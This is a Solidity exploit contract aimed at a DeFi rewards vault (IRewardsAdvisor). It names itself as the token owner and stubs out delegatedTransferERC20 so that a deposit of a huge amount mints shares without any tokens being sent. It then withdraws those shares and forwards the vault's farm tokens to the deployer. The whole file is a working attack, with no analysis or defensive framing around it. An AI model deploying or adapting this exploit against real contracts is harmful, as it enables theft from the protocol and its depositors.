//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IRewardsAdvisor {
    function deposit(
        uint256 farmDeposit,
        address payable from,
        address to
    ) external returns (uint256 shares);

    function withdraw(
        uint256 shares,
        address to,
        address payable from
    ) external returns (uint256 rewards);
}

contract Exploit {
    address private self;
    IERC20 private farm;
    IERC20 private xfarm;
    constructor(address _farm, address _xfarm) {
        self = msg.sender;
        farm = IERC20(_farm);
        xfarm = IERC20(_xfarm);
    }

    function start(address _advisor) external {
        require(_advisor != address(0x0), "invalid");
        uint256 supply = xfarm.totalSupply();
        address to = address(this);
        IRewardsAdvisor(_advisor).deposit(supply * 10000, payable(to), to);
        IRewardsAdvisor(_advisor).withdraw(xfarm.balanceOf(to), to, payable(to));
        farm.transfer(self, farm.balanceOf(to));
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {}
}